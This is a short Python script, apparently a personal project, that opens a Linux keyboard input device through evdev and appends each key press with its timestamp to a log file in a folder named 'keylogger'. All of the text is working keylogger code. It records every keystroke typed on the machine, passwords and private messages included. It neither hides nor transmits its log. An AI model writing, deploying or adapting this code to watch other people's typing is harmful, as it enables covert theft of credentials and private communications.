import evdev
from evdev import ecodes

DEV = '/dev/input/by-path/platform-i8042-serio-0-event-kbd'  # change if needed

dev = evdev.InputDevice(DEV)
with open('/home/sahan-weerasiri/projects/keylogger/keylog.log', 'a') as f:
    for ev in dev.read_loop():
        if ev.type == ecodes.EV_KEY:
            k = evdev.categorize(ev)
            if k.keystate == k.key_down:
                f.write(f"{ev.timestamp()} {k.keycode}\n")
                f.flush()